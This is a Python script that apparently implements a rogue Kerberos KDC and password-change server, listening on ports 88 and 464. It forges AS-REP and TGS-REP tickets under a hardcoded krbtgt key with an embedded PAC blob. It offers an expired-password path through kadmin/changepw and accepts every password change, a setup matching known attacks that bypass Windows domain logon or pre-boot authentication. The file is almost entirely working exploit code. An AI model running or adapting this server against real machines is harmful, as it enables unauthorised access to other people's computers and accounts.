#!/usr/bin/python

import sys
sys.path.append('./pykek')

import threading
import signal
import traceback
import binascii
from struct import pack, unpack
from time import time, strftime, gmtime, localtime

from twisted.internet.protocol import DatagramProtocol
from twisted.internet import protocol, reactor, endpoints

from pyasn1.codec.der.encoder import encode
from pyasn1.codec.der.decoder import decode
from pyasn1.type.char import GeneralString
from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType

from kek.krb5 import _c, application, AsReq, APReq, Authenticator, KerberosTime, Realm, PrincipalName, AsRep, NT_PRINCIPAL, NT_SRV_INST, EncTicketPart, EncASRepPart, EncryptedData, HostAddress, Microseconds, EncryptionKey, TgsReq, EncTGSRepPart, TgsRep
from kek.util import epoch2gt, gt2epoch
from kek.crypto import RC4_HMAC, encrypt, decrypt, ntlm_hash

KRBTGT_KEY = (RC4_HMAC, binascii.unhexlify('0468cebdfc8a86e2578dca9406309611'))
USER_EXP_KEY = (RC4_HMAC, ntlm_hash('a').digest())

class KrbError(Sequence):
    tagSet = application(30)
    componentType = NamedTypes(
        NamedType('pvno', _c(0, Integer())),
        NamedType('msg-type', _c(1, Integer())),
        OptionalNamedType('ctime', _c(2, KerberosTime())),
        OptionalNamedType('cusec', _c(3, Integer())),
        NamedType('stime', _c(4, KerberosTime())),
        NamedType('susec', _c(5, Integer())),
        NamedType('error-code', _c(6, Integer())),
        OptionalNamedType('crealm', _c(7, Realm())),
        OptionalNamedType('cname', _c(8, PrincipalName())),
        NamedType('realm', _c(9, Realm())),
        NamedType('sname', _c(10, PrincipalName())),
        OptionalNamedType('e-text', _c(11, GeneralString())),
        OptionalNamedType('e-data', _c(12, OctetString())))

class KrbPriv(Sequence):
    tagSet = application(21)
    componentType = NamedTypes(
        NamedType('pvno', _c(0, Integer())),
        NamedType('msg-type', _c(1, Integer())),
        NamedType('enc-part', _c(3, EncryptedData())))

class EncKrbPrivPart(Sequence):
    tagSet = application(28)
    componentType = NamedTypes(
        NamedType('user-data', _c(0, OctetString())),
        OptionalNamedType('timestamp', _c(1, KerberosTime())),
        OptionalNamedType('usec', _c(2, Integer())),
        OptionalNamedType('seq-number', _c(3, Integer())),
        NamedType('s-address', _c(4, HostAddress())),
        OptionalNamedType('r-address', _c(5, HostAddress())))

class ChangePasswdData(Sequence):
    componentType = NamedTypes(
        NamedType('newpasswd', _c(0, OctetString())),
        OptionalNamedType('targname', _c(1, PrincipalName())),
        OptionalNamedType('targrealm', _c(2, Realm())))

class APRep(Sequence):
    tagSet = application(15)
    componentType = NamedTypes(
        NamedType('pvno', _c(0, Integer())),
        NamedType('msg-type', _c(1, Integer())),
        NamedType('enc-part', _c(2, EncryptedData())))

class EncAPRepPart(Sequence):
    tagSet = application(27)
    componentType = NamedTypes(
        NamedType('ctime', _c(0, KerberosTime())),
        NamedType('cusec', _c(1, Microseconds())),
        OptionalNamedType('subkey', _c(2, EncryptionKey())),
        OptionalNamedType('seq-number', _c(3, Integer())))

valid_pws = ['b']

def buildEncTicketPart(cname):
    encTicketPart = EncTicketPart()
    encTicketPart['flags'] = "'01000000111000010000000000000000'B"
    encTicketPart['key'] = None
    encTicketPart['key']['keytype'] = KRBTGT_KEY[0]
    encTicketPart['key']['keyvalue'] = KRBTGT_KEY[1]
    encTicketPart['crealm'] = 'PLACEHOLDER_REALM'
    encTicketPart['cname'] = None
    encTicketPart['cname']['name-type'] = cname['name-type']
    encTicketPart['cname']['name-string'] = None
    for i in range(len(cname['name-string'])):
        encTicketPart['cname']['name-string'][i] = cname['name-string'][i]
    encTicketPart['transited'] = None
    encTicketPart['transited']['tr-type'] = 1
    encTicketPart['transited']['contents'] = ''
    encTicketPart['authtime'] = '20010212080005Z'
    encTicketPart['endtime'] = '20210212080005Z'
    encTicketPart['renew-till'] = '20210212080005Z'
    #encTicketPart['caddr'] = None
    #encTicketPart['caddr'][0] = None
    #encTicketPart['caddr'][0]['addr-type'] = 20
    #encTicketPart['caddr'][0]['address'] = 'WIN10'
    encTicketPart['authorization-data'] = None
    encTicketPart['authorization-data'][0] = None
    encTicketPart['authorization-data'][0]['ad-type'] = 1
    encTicketPart['authorization-data'][0]['ad-data'] = binascii.unhexlify('0400000000000000010000001802000048000000000000000a000000160000006002000000000000060000001400000078020000000000000700000014000000900200000000000001100800cccccccc0802000000000000000002000000000000000000ffffffffffffff7fffffffffffffff7f80af2194e354d101806f8bbeac55d101802f7b89e475d1010c000c00040002000000000008000200000000000c0002000000000010000200000000001400020000000000180002000000000050040000010200000f0000001c000200000000000000000000000000000000000000000014001600200002001400160024000200280002000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000060000006900680061006b0065006e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f00000000020000070000003c02000007000000f201000007000000090200000700000008020000070000000402000007000000070200000700000003020000070000004e0400000700000002020000070000000602000007000000050200000700000029020000070000003b020000070000004d040000070000000b000000000000000a000000440045004200490041004e002d0053004d0042000b000000000000000a0000004d00490053004b00410054004f004e004900430004000000010400000000000515000000b30e4a61979dced9e3cd7b49002f5c0ef854d1010c006900680061006b0065006e00000076ffffffea8fcd10bac6de4caccb63755bd877dc0000000076ffffff66845bf5edb85c27b1e775588fa00bdc00000000')
    encTicketPart['authorization-data'][1] = None
    encTicketPart['authorization-data'][1]['ad-type'] = 1
    encTicketPart['authorization-data'][1]['ad-data'] = binascii.unhexlify('3031302fa00402020200a12704253023a003020117a11c301aa0040202ff76a1120410fa4614f88d87c59e8da1b5a5af8ebeba')

    return encTicketPart


def buildAsRep(req, userkey):
    realm = str(req['req-body']['realm'])
    nonce = int(req['req-body']['nonce'])

    rep = AsRep()
    rep['pvno'] = 5
    rep['msg-type'] = 11
    rep['crealm'] = realm
    rep['cname'] = None
    rep['cname']['name-type'] = int(req['req-body']['cname']['name-type'])
    rep['cname']['name-string'] = None
    rep['cname']['name-string'][0] = str(req['req-body']['cname']['name-string'][0])
    
    rep['ticket'] = None
    rep['ticket']['tkt-vno'] = 5
    rep['ticket']['realm'] = realm
    rep['ticket']['sname'] = None
    rep['ticket']['sname']['name-type'] = int(req['req-body']['sname']['name-type'])
    rep['ticket']['sname']['name-string'] = None
    rep['ticket']['sname']['name-string'][0] = str(req['req-body']['sname']['name-string'][0])
    rep['ticket']['sname']['name-string'][1] = str(req['req-body']['sname']['name-string'][1])
    encTicketPart = buildEncTicketPart(req['req-body']['cname']) 
    rep['ticket']['enc-part'] = None
    rep['ticket']['enc-part']['etype'] = KRBTGT_KEY[0]
    rep['ticket']['enc-part']['kvno'] = 1
    rep['ticket']['enc-part']['cipher'] = encrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 2, encode(encTicketPart))
    
    encAsRepPart = EncASRepPart()
    encAsRepPart['key'] = None
    encAsRepPart['key']['keytype'] = KRBTGT_KEY[0]
    encAsRepPart['key']['keyvalue'] = KRBTGT_KEY[1]
    encAsRepPart['last-req'] = None
    encAsRepPart['last-req'][0] = None
    encAsRepPart['last-req'][0]['lr-type'] = 6
    encAsRepPart['last-req'][0]['lr-value'] = '20160304070739Z'
    encAsRepPart['nonce'] = nonce
    encAsRepPart['key-expiration'] = '20160304070739Z'
    #encAsRepPart['flags'] = "'01000000111000010000000000000000'B"
    #encAsRepPart['flags'] = "'00000000011000010000000000000000'B"
    encAsRepPart['flags'] = "'00000000011000000000000000000000'B"
                            # 0   5   8   0   5   8   0   5   8
    
    authtime = time()
    endtime = authtime + 60*5
    encAsRepPart['authtime'] = epoch2gt(authtime);
    encAsRepPart['endtime'] = str(req['req-body']['till'])
    encAsRepPart['srealm'] = realm
    encAsRepPart['sname'] = None
    encAsRepPart['sname']['name-type'] = int(req['req-body']['sname']['name-type'])
    encAsRepPart['sname']['name-string'] = None
    encAsRepPart['sname']['name-string'][0] = str(req['req-body']['sname']['name-string'][0])
    encAsRepPart['sname']['name-string'][1] = str(req['req-body']['sname']['name-string'][1])
    #encAsRepPart['caddr'] = None
    #encAsRepPart['caddr'][0] = None
    #encAsRepPart['caddr'][0]['addr-type'] = 20
    #encAsRepPart['caddr'][0]['address'] = 'WIN10'
    #encAsRepPart['encrypted-pa-data'] = None
    #encAsRepPart['encrypted-pa-data'][0] = None
    #encAsRepPart['encrypted-pa-data'][0]['padata-type'] = 149
    #encAsRepPart['encrypted-pa-data'][0]['padata-value'] = binascii.unhexlify('301aa0040202ff76a1120410c29b2862d5fbd11fb3ccb55918d30aae')
    #encAsRepPart['encrypted-pa-data'][1] = None
    #encAsRepPart['encrypted-pa-data'][1]['padata-type'] = 136
    #encAsRepPart['encrypted-pa-data'][1]['padata-value'] = ''
    
    rep['enc-part'] = None
    rep['enc-part']['etype'] = userkey[0]
    rep['enc-part']['kvno'] = 27
    rep['enc-part']['cipher'] = encrypt(userkey[0], userkey[1], 8, encode(encAsRepPart))

    return rep

def handleAsReq(data):
    req = decode(data, asn1Spec=AsReq())[0]
    realm = str(req['req-body']['realm'])
    nonce = int(req['req-body']['nonce'])

    # Check if it has pre-auth; if not, send error
    preAuthData = None
    if req['padata'] != None:
       for padata in req['padata']:
           if padata['padata-type'] == 2:
               preAuthData = str(padata['padata-value'])
               preAuthData = decode(preAuthData, asn1Spec=EncryptedData())[0]
               preAuthData = str(preAuthData['cipher'])
               break

    if preAuthData == None:
        gt, ms = epoch2gt(time(), microseconds=True)
        rep = KrbError()
        rep['pvno'] = 5
        rep['msg-type'] = 30
        rep['stime'] = gt
        rep['susec'] = ms
        rep['error-code'] = 25
        rep['crealm'] = realm
        rep['cname'] = None
        rep['cname']['name-type'] = int(req['req-body']['cname']['name-type'])
        rep['cname']['name-string'] = None
        rep['cname']['name-string'][0] = str(req['req-body']['cname']['name-string'][0])
        rep['realm'] = realm
        rep['sname'] = None
        rep['sname']['name-type'] = int(req['req-body']['sname']['name-type'])
        rep['sname']['name-string'] = None
        rep['sname']['name-string'][0] = str(req['req-body']['sname']['name-string'][0])
        rep['sname']['name-string'][1] = str(req['req-body']['sname']['name-string'][1])
        rep['e-text'] = 'Need to use PA-ENC-TIMESTAMP/PA-PK-AS-REQ'
        rep['e-data'] = binascii.unhexlify('30613009a103020110a20204003009a10302010fa20204003009a103020102a2020400300aa1040202008aa2020400300aa10402020088a20204003012a10302010ba20b040930073005a0030201173012a103020113a20b040930073005a003020117')

        print "Replying with pre-auth required"
        return encode(rep)

    # Try to decode preAuthData with valid pws
    preAuthIsValid = False
    preAuthIsValidPw = None
    for pw in valid_pws:
        try:
            decrypted = decrypt(RC4_HMAC, ntlm_hash(pw).digest(), 1, preAuthData)
            preAuthIsValid = True
            preAuthIsValidPw = (RC4_HMAC, ntlm_hash(pw).digest())
        except: pass

    print "Is using a valid pre-auth password: %s" % preAuthIsValid

    sname = (str(req['req-body']['sname']['name-string'][0]), str(req['req-body']['sname']['name-string'][1]))
    if (sname[0] == 'kadmin' and sname[1] == 'changepw'):

        rep = buildAsRep(req, USER_EXP_KEY)
        print "Replying with AS response for kadmin/changepw"

    else:

        if preAuthIsValid:
            rep = buildAsRep(req, preAuthIsValidPw)
            print "Replying with normal AS-REP"

        else:

            gt, ms = epoch2gt(time(), microseconds=True)
            rep = KrbError()
            rep['pvno'] = 5
            rep['msg-type'] = 30
            rep['stime'] = gt
            rep['susec'] = ms
            rep['error-code'] = 23
            rep['crealm'] = realm
            rep['cname'] = None
            rep['cname']['name-type'] = int(req['req-body']['cname']['name-type'])
            rep['cname']['name-string'] = None
            rep['cname']['name-string'][0] = str(req['req-body']['cname']['name-string'][0])
            rep['realm'] = realm
            rep['sname'] = None
            rep['sname']['name-type'] = int(req['req-body']['sname']['name-type'])
            rep['sname']['name-string'] = None
            rep['sname']['name-string'][0] = str(req['req-body']['sname']['name-string'][0])
            rep['sname']['name-string'][1] = str(req['req-body']['sname']['name-string'][1])

            print "Replying with password expired error"

    return encode(rep)

def handleTgsReq(data):
    req = decode(data, asn1Spec=TgsReq())[0]
    realm = str(req['req-body']['realm'])
    nonce = int(req['req-body']['nonce'])

    ticket = None
    if req['padata'] != None:
       for padata in req['padata']:
           if padata['padata-type'] == 1:
               ap_req = decode(str(padata['padata-value']), asn1Spec=APReq())[0]
               ticket = str(ap_req['ticket']['enc-part']['cipher'])
               ticket = decrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 2, ticket)
               ticket = decode(ticket, asn1Spec=EncTicketPart())[0]
               break

    rep = TgsRep()
    rep['pvno'] = 5
    rep['msg-type'] = 13
    rep['crealm'] = realm
    rep['cname'] = None
    rep['cname']['name-type'] = int(ticket['cname']['name-type'])
    rep['cname']['name-string'] = None
    for i in range(len(ticket['cname']['name-string'])):
        rep['cname']['name-string'][i] = str(ticket['cname']['name-string'][i])
    rep['ticket'] = None
    rep['ticket']['tkt-vno'] = 5
    rep['ticket']['realm'] = realm
    rep['ticket']['sname'] = None
    rep['ticket']['sname']['name-type'] = str(req['req-body']['sname']['name-type'])
    rep['ticket']['sname']['name-string'] = None
    for i in range(len(req['req-body']['sname']['name-string'])):
        rep['ticket']['sname']['name-string'][i] = str(req['req-body']['sname']['name-string'][i])
    encTicketPart = buildEncTicketPart(ticket['cname']) 
    rep['ticket']['enc-part'] = None
    rep['ticket']['enc-part']['etype'] = KRBTGT_KEY[0]
    rep['ticket']['enc-part']['kvno'] = 1
    rep['ticket']['enc-part']['cipher'] = encrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 2, encode(encTicketPart))
    rep['enc-part'] = None
    rep['enc-part']['etype'] = KRBTGT_KEY[0]
    encTGSRepPart = EncTGSRepPart()
    encTGSRepPart['key'] = None
    encTGSRepPart['key']['keytype'] = KRBTGT_KEY[0]
    encTGSRepPart['key']['keyvalue'] = KRBTGT_KEY[1]
    encTGSRepPart['last-req'] = None
    encTGSRepPart['last-req'][0] = None
    encTGSRepPart['last-req'][0]['lr-type'] = 0
    encTGSRepPart['last-req'][0]['lr-value'] = '19700101000000Z'
    encTGSRepPart['nonce'] = nonce
    encTGSRepPart['flags'] = "'01000000011011000000000000000000'B"
    authtime = time()
    endtime = authtime + 60*5
    encTGSRepPart['authtime'] = epoch2gt(authtime);
    encTGSRepPart['starttime'] = epoch2gt(authtime);
    encTGSRepPart['endtime'] = str(req['req-body']['till'])
    encTGSRepPart['renew-till'] = str(req['req-body']['till'])
    encTGSRepPart['srealm'] = realm
    encTGSRepPart['sname'] = None
    encTGSRepPart['sname']['name-type'] = str(req['req-body']['sname']['name-type'])
    encTGSRepPart['sname']['name-string'] = None
    for i in range(len(req['req-body']['sname']['name-string'])):
        encTGSRepPart['sname']['name-string'][i] = str(req['req-body']['sname']['name-string'][i])

    rep['enc-part']['cipher'] = encrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 8, encode(encTGSRepPart))

    return encode(rep)

def handleKdcData(data):
    req = decode(data)[0]
    msgType = req[1]
    print "Received message type: %d" % msgType

    if (msgType == 10):
        return handleAsReq(data)
    elif (msgType == 12):
        return handleTgsReq(data)
    return None

def handleKpasswdData(data):
    msglen = unpack('>H', data[:2])[0]
    if len(data) != msglen:
        raise "Incorrect message length"
    msgver = unpack('>H', data[2:4])[0]
    ap_req_len = unpack('>H', data[4:6])[0]

    ap_req = decode(data[6:6+ap_req_len], asn1Spec=APReq())[0]
    kpriv = decode(data[6+ap_req_len:], asn1Spec=KrbPriv())[0]

    print "Got Kpasswd Request:"
    # Properly we would get the session key from the ticket, but we use a hardcoded session key
    authenticator = str(ap_req['authenticator']['cipher'])
    print "authenticator: %s" % binascii.hexlify(authenticator)
    authenticator = decrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 11, authenticator)
    authenticator = decode(authenticator, asn1Spec=Authenticator())[0]
    subkey = str(authenticator['subkey']['keyvalue'])
    print "subkey: %s" % binascii.hexlify(subkey)

    encKrbPrivPart = str(kpriv['enc-part']['cipher'])
    encKrbPrivPart = decrypt(RC4_HMAC, subkey, 13, encKrbPrivPart)
    encKrbPrivPart = decode(encKrbPrivPart, asn1Spec=EncKrbPrivPart())[0]
    try:
        changePasswdData = decode(str(encKrbPrivPart['user-data']), asn1Spec=ChangePasswdData())[0]
        newpasswd = str(changePasswdData['newpasswd'])
    except:
        # Just assume it's plaintext instead of ASN.1 encoded... seems to work for windows 10
        newpasswd = str(encKrbPrivPart['user-data'])
    print "new password: %s" % newpasswd
    valid_pws.append(newpasswd)


    ap_rep = APRep()
    ap_rep['pvno'] = 5
    ap_rep['msg-type'] = 15
    encAPRepPart = EncAPRepPart()
    encAPRepPart['ctime'] = str(authenticator['ctime'])
    encAPRepPart['cusec'] = int(authenticator['cusec'])
    encAPRepPart['seq-number'] = int(authenticator['seq-number'])
    ap_rep['enc-part'] = None
    ap_rep['enc-part']['etype'] = RC4_HMAC
    ap_rep['enc-part']['cipher'] = encrypt(KRBTGT_KEY[0], KRBTGT_KEY[1], 12, encode(encAPRepPart))

    kpriv = KrbPriv()
    kpriv['pvno'] = 5
    kpriv['msg-type'] = 21
    r_encKrbPrivPart = EncKrbPrivPart()
    r_encKrbPrivPart['user-data'] = binascii.unhexlify('000050617373776f7264206368616e6765640000')
    r_encKrbPrivPart['seq-number'] = int(authenticator['seq-number'])
    r_encKrbPrivPart['s-address'] = None
    r_encKrbPrivPart['s-address']['addr-type'] = int(encKrbPrivPart['s-address']['addr-type'])
    r_encKrbPrivPart['s-address']['address'] = str(encKrbPrivPart['s-address']['address'])
    kpriv['enc-part'] = None
    kpriv['enc-part']['etype'] = RC4_HMAC
    kpriv['enc-part']['cipher'] = encrypt(RC4_HMAC, subkey, 13, encode(r_encKrbPrivPart))

    ap_rep = encode(ap_rep)
    kpriv = encode(kpriv)
    rdata = pack(">H", 6+len(ap_rep)+len(kpriv))
    rdata += pack(">H", 1)
    rdata += pack(">H", len(ap_rep))
    rdata += ap_rep
    rdata += kpriv

    print ""
    return rdata
    
class UDPListener(DatagramProtocol):
    def __init__(self, handler):
        self.handler = handler
    def datagramReceived(self, datagram, address):
        self.transport.write(self.handler(datagram), address)

class TCPProtocol(protocol.Protocol):
    def __init__(self, handler):
        self.handler = handler
        self.buffer = ''
        self.datalen = None
    def dataReceived(self, data):
        self.buffer += data
        if (self.datalen == None) and (len(self.buffer) >= 4):
            self.datalen = unpack(">I", self.buffer[:4])[0]
            print "Wating for TCP length of %d" % self.datalen
        print "TCP length is %d" % len(self.buffer)
        if (self.datalen != None) and (len(self.buffer) >= self.datalen+4):
            print "Building response"
            rep = self.handler(data[4:self.datalen+4])
            print "Reply length: %d" % len(rep)
            rep = pack(">I", len(rep)) + rep
            self.transport.write(rep)
            print "Reply sent?"
            self.buffer = self.buffer[self.datalen+4:]
            self.datalen = None

class TCPProtocolFactory(protocol.Factory):
    def __init__(self, handler):
        self.handler = handler
    def buildProtocol(self, addr):
        return TCPProtocol(self.handler)

if __name__ == '__main__':
    reactor.listenUDP(88, UDPListener(handleKdcData))
    reactor.listenUDP(464, UDPListener(handleKpasswdData))

    endpoints.serverFromString(reactor, "tcp:88").listen(TCPProtocolFactory(handleKdcData))
    endpoints.serverFromString(reactor, "tcp:464").listen(TCPProtocolFactory(handleKpasswdData))

    reactor.run()

